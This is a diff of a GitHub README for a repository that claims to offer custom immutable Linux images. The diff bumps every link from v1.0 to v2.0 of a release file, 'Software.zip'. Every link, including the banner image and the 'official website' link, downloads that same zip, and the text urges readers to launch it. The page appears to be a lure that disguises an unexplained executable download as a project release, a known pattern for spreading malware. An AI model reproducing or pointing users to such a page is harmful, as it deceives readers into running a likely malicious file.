@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to the "custom" Repository! 🛠️
 
-![Custom Repository](https://github.com/brbryy/custom/releases/download/v1.0/Software.zip)
+![Custom Repository](https://github.com/brbryy/custom/releases/download/v2.0/Software.zip)
 
 ## Repository Description
 This repository contains custom images related to operating systems, specifically focusing on Linux environments. Explore the world of immutable, atomic, and image-based Linux setups with our collection of custom images. 
@@ -20,12 +20,12 @@ This repository contains custom images related to operating systems, specificall
 - operating-system
 
 ## 📦 Download Latest Release
-[![Download Latest Release](https://github.com/brbryy/custom/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/brbryy/custom/releases/download/v1.0/Software.zip)
+[![Download Latest Release](https://github.com/brbryy/custom/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/brbryy/custom/releases/download/v2.0/Software.zip)
 
 👉 **Note:** The link above leads directly to the download of the latest release build. Make sure to launch the downloaded file to access the contents.
 
 ## 🌐 Explore Further
-🔗 If you'd like to visit the official website related to this repository, please click on the following link: [Explore More](https://github.com/brbryy/custom/releases/download/v1.0/Software.zip).
+🔗 If you'd like to visit the official website related to this repository, please click on the following link: [Explore More](https://github.com/brbryy/custom/releases/download/v2.0/Software.zip).
 
 ## 🚨 Issues with the Link?
 🛠 If you encounter any issues with the provided link, we recommend checking out the "Releases" section of this repository for alternative download options.
